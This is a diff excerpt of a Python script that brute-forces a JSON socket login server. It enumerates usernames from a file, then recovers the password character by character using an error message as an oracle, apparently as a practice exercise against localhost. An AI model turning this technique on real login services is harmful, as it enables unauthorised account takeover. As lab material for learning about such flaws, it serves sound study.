@@ -11,29 +11,26 @@ log_pass = {
 
 with open('logins.txt', 'r') as logins_file:
     logins = [x.strip('\n') for x in logins_file]
-log_pass_dumps = json.dumps(log_pass)
-log_pass_loads = json.loads(log_pass_dumps)
-
 
 def connecting_to_server():
     correct_login, correct_password = '', ''
     connection = socket.socket()
     argv = sys.argv
-    host, port = argv[1], int(argv[2])
+    host, port = "localhost", 9090
     connection.connect((host, port))
     for i in brut_force_login(logins):
-        log_pass_loads['login'] = i
+        log_pass['login'] = i
         # converts to json format and converts to bytes and  sends through socket
-        connection.send(json.dumps(log_pass_loads).encode())
+        connection.send(json.dumps(log_pass).encode())
         # 1024 are the maximum number of bytes and decodes from json into python dict                                          # to be received at once
         answer = json.loads(connection.recv(1024))
         if answer['result'] == 'Wrong password!':
-            correct_login = log_pass_loads['login']
+            correct_login = log_pass['login']
             break
     for k in range(1_000_000):
         for i in brut_force_password():
-            log_pass_loads['password'] = correct_password + i
-            connection.send(json.dumps(log_pass_loads).encode())
+            log_pass['password'] = correct_password + i
+            connection.send(json.dumps(log_pass).encode())
             answer = json.loads(connection.recv(1024))
             if answer['result'] == 'Exception happened during login':
                 correct_password = correct_password + i
